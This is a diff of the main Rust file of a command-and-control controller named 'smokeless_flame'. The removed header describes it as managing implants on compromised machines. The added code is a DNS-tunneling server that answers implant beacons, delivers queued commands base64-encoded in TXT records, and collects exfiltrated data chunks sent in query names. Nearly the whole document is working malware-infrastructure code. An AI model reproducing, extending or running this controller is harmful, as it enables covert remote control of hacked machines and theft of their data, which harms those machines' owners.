@@ -1,57 +1,107 @@
-/* smokeless_flame - controller/src/main.rs
-*
-*   Purpose: Act as the controller/server for implants on compromised machines. Ideas are taken from my NFS implementation.
-*            This will be a custom implementation that uses encryption and authentication to ensure secure and obfuscate communication.
-*            The controller will manage multiple implants and allow for file transfers, command execution, and other features.
-*            This will use a custom protocol over TCP, with optional TLS for added security.
-*
-*   Author: Mauzy0x00
-*   Start Date: 10-14-2025
-*
-*   File Description: This is the main function of the controller. Supporting functions and loops will be called here
-*/
-
 mod server;
+use server::*;
+use std::net::UdpSocket;
+use std::sync::{Arc, Mutex};
+use std::thread;
 
-use clap::Parser;
+fn main() -> std::io::Result<()> {
+    print_banner();
 
-#[derive(Parser, Debug)]
-#[command(author, version, about, long_about = None)]
-struct Cli {
-    /// Turn on verbose logging
-    #[arg(short, long)]
-    verbose: Option<bool>,
+    let socket = UdpSocket::bind("0.0.0.0:5353")?;
+    let c2_state = Arc::new(Mutex::new(C2State::new()));
 
-    /// Address to bind to
-    #[arg(short, long, default_value = "0.0.0.0:443")]
-    bind_address: String,
-}
+    // Start CLI thread
+    let cli_state = Arc::clone(&c2_state);
+    thread::spawn(move || {
+        cli_loop(cli_state);
+    });
 
-fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let cli = Cli::parse();
+    let mut buf = [0u8; 512];
 
-    // Initialize logger
-    if let Some(true) = cli.verbose {
-        env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("debug")).init();
-    } else {
-        env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
+    loop {
+        let (len, src) = socket.recv_from(&mut buf)?;
+
+        println!("\n[+] DNS Query from {}", src);
+
+        match DnsHeader::from_bytes(&buf[..len]) {
+            Ok(_header) => {
+                if let Ok(question) = parse_question(&buf, 12) {
+                    println!("    Domain: {} (Type: {:?})", question.name, question.qtype);
+
+                    if let Some(c2_req) = parse_c2_request(&question.name) {
+                        let mut state = c2_state.lock().unwrap();
+
+                        match c2_req {
+                            C2Request::Beacon { implant_id } => {
+                                println!("    [BEACON] {}", implant_id);
+                                let has_cmds = state.has_commands(&implant_id);
+                                let response = build_a_record_response(
+                                    &buf[..len],
+                                    12 + question.name_length,
+                                    has_cmds,
+                                );
+                                socket.send_to(&response, src)?;
+                                println!(
+                                    "    Response: {}",
+                                    if has_cmds {
+                                        "Commands queued"
+                                    } else {
+                                        "No commands"
+                                    }
+                                );
+                            }
+
+                            C2Request::FetchCommand { implant_id } => {
+                                println!("    [FETCH_CMD] {}", implant_id);
+
+                                if question.qtype == QType::TXT {
+                                    if let Some(cmd) = state.get_next_command(&implant_id) {
+                                        let encoded = base64_encode(&cmd);
+                                        let response = build_txt_record_response(
+                                            &buf[..len],
+                                            12 + question.name_length,
+                                            &encoded,
+                                        );
+                                        socket.send_to(&response, src)?;
+                                        println!("    Sent: {}", cmd);
+                                    } else {
+                                        let response = build_txt_record_response(
+                                            &buf[..len],
+                                            12 + question.name_length,
+                                            "NONE",
+                                        );
+                                        socket.send_to(&response, src)?;
+                                        println!("    No commands available");
+                                    }
+                                }
+                            }
+
+                            C2Request::Exfiltrate {
+                                implant_id,
+                                sequence,
+                                data,
+                            } => {
+                                println!(
+                                    "    [EXFIL] {} [seq:{}] data:{}",
+                                    implant_id, sequence, data
+                                );
+                                state.store_chunk(&implant_id, sequence, data);
+
+                                let response = build_a_record_response(
+                                    &buf[..len],
+                                    12 + question.name_length,
+                                    false,
+                                );
+                                socket.send_to(&response, src)?;
+                                println!("    ACK sent");
+                            }
+                        }
+                    }
+                }
+            }
+            Err(e) => {
+                println!("    [!] Error: {}", e);
+            }
+        }
     }
-
-    let Cli {
-        verbose,
-        bind_address,
-    } = cli;
-    {
-        log::info!(
-            "Starting NFS server, exporting {} on {}",
-            export_path.display(),
-            bind_address
-        );
-
-        // Create and run server
-        let server = server::NfsServer::new(bind_address)?;
-
-        smol::block_on(server.run())?;
-    }
-    Ok(())
 }
